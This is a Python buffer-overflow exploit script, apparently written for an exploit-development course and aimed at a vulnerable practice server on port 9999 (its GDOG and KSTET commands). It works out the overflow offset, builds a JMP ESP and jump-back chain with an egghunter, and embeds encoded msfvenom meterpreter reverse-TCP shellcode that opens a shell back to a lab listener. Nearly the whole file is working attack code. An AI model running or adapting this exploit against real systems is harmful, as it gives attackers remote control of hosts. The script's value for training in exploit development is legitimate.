import sys
import socket


evilString = "A" * 256
evilString = "A" * 700
# Buffer will not expand past it's initial length

# Create cyclic pattern
cyclic_pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A"
evilString = cyclic_pattern
#root@kali:~/Documents/exploitdev-udemy/egghunters# msf-pattern_offset -q 63413363
#[*] Exact match at offset 70, we now know how far to jump back
evilString = "A"*70 + "B"*4 + "C"*(256-4-70)

JMP_ESP = "\xaf\x11\x50\x62"

# Jump back 70 bytes
#root@kali:~# msf-nasm_shell 
#nasm > jmp $-70
#00000000  EBB8              jmp short 0xffffffba
#nasm > 
JMP_BACK_70 = "\xEB\xB8\x90\x90"
#shellcode = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"
#shellcode = "w00tw00t" + "A"*1000

egghunter =  b""
egghunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd"
egghunter += b"\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74"
egghunter += b"\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

#root@kali:~/Documents/exploitdev-udemy/egghunters# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.122.110 LPORT=4444 -b '\x00' -f python -v shellcode
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#[-] No arch selected, selecting arch: x86 from the payload
#Found 11 compatible encoders
#Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
#x86/shikata_ga_nai succeeded with size 368 (iteration=0)
#x86/shikata_ga_nai chosen with final size 368
#Payload size: 368 bytes
#Final size of python file: 2067 bytes
shellcode =  b""
shellcode += b"\xdb\xd6\xb8\x91\x85\x1b\x9f\xd9\x74\x24\xf4"
shellcode += b"\x5b\x31\xc9\xb1\x56\x83\xc3\x04\x31\x43\x14"
shellcode += b"\x03\x43\x85\x67\xee\x63\x4d\xe5\x11\x9c\x8d"
shellcode += b"\x8a\x98\x79\xbc\x8a\xff\x0a\xee\x3a\x8b\x5f"
shellcode += b"\x02\xb0\xd9\x4b\x91\xb4\xf5\x7c\x12\x72\x20"
shellcode += b"\xb2\xa3\x2f\x10\xd5\x27\x32\x45\x35\x16\xfd"
shellcode += b"\x98\x34\x5f\xe0\x51\x64\x08\x6e\xc7\x99\x3d"
shellcode += b"\x3a\xd4\x12\x0d\xaa\x5c\xc6\xc5\xcd\x4d\x59"
shellcode += b"\x5e\x94\x4d\x5b\xb3\xac\xc7\x43\xd0\x89\x9e"
shellcode += b"\xf8\x22\x65\x21\x29\x7b\x86\x8e\x14\xb4\x75"
shellcode += b"\xce\x51\x72\x66\xa5\xab\x81\x1b\xbe\x6f\xf8"
shellcode += b"\xc7\x4b\x74\x5a\x83\xec\x50\x5b\x40\x6a\x12"
shellcode += b"\x57\x2d\xf8\x7c\x7b\xb0\x2d\xf7\x87\x39\xd0"
shellcode += b"\xd8\x0e\x79\xf7\xfc\x4b\xd9\x96\xa5\x31\x8c"
shellcode += b"\xa7\xb6\x9a\x71\x02\xbc\x36\x65\x3f\x9f\x5e"
shellcode += b"\x4a\x72\x20\x9e\xc4\x05\x53\xac\x4b\xbe\xfb"
shellcode += b"\x9c\x04\x18\xfb\x95\x03\x9b\xd3\x1d\x43\x65"
shellcode += b"\xd4\x5d\x4d\xa2\x80\x0d\xe5\x03\xa9\xc6\xf5"
shellcode += b"\xac\x7c\x72\xfc\x3a\xbf\x2a\x7a\xd5\x57\x28"
shellcode += b"\x7b\x38\xf4\xa5\x9d\x6a\x54\xe5\x31\xcb\x04"
shellcode += b"\x45\xe2\xa3\x4e\x4a\xdd\xd4\x70\x81\x76\x7e"
shellcode += b"\x9f\x7f\x2e\x17\x06\xda\xa4\x86\xc7\xf1\xc0"
shellcode += b"\x89\x4c\xf3\x35\x47\xa5\x76\x26\xb0\xd2\x78"
shellcode += b"\xb6\x41\x77\x78\xdc\x45\xd1\x2f\x48\x44\x04"
shellcode += b"\x07\xd7\xb7\x63\x14\x10\x47\xf2\x2c\x6a\x7e"
shellcode += b"\x60\x10\x04\x7f\x64\x90\xd4\x29\xee\x90\xbc"
shellcode += b"\x8d\x4a\xc3\xd9\xd1\x46\x70\x72\x44\x69\x20"
shellcode += b"\x26\xcf\x01\xce\x11\x27\x8e\x31\x74\x3b\xc9"
shellcode += b"\xcd\x0a\x14\x72\xa5\xf4\x24\x82\x35\x9f\xa4"
shellcode += b"\xd2\x5d\x54\x8a\xdd\xad\x95\x01\xb6\xa5\x1c"
shellcode += b"\xc4\x74\x54\x20\xcd\xd9\xc8\x21\xe2\xc1\xfb"
shellcode += b"\x58\x8b\xf6\xfc\x9c\x85\x92\xfd\x9c\xa9\xa4"
shellcode += b"\xc2\x4a\x90\xd2\x05\x4f\xa7\xed\x30\xf2\x8e"
shellcode += b"\x67\x3a\xa0\xd1\xad"

shellcode = "w00tw00t" + shellcode

evilString = "A"*70 + JMP_ESP + JMP_BACK_70 + "C"*(256-4-70-4)

evilString = "\x90"*18 + egghunter + "\x90"*20 + JMP_ESP + JMP_BACK_70 + "C"*(256-18-32-20-4-4)

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

command1 = "GDOG " + shellcode
s.connect(('192.168.122.125',9999))
s.recv(1024)
s.send(command1)
s.close()

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

command2 = "KSTET " + evilString

s.connect(('192.168.122.125',9999))
s.recv(1024)
s.send(command2)
s.close()
